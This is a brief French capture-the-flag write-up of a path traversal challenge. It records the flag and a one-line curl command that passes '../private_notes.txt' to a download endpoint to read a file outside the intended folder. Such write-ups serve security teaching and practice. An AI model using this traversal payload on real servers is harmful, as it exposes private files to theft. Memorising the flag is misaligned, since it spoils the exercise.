# Path traversal

flag: `FLAG{d0t_d0t_sl4sh_4ll_th3_w4y_d0wn}`

On a trouver le lien de telechargement sur `/projects` et grace aux headers HTTP on a le nom d'un
ficher a chercher `private_notes.txt`.

Plus qu'a tester et hop!

```shell
curl -si -b "session=$cookie" http://$target/projects/download'?file=../private_notes.txt'
```
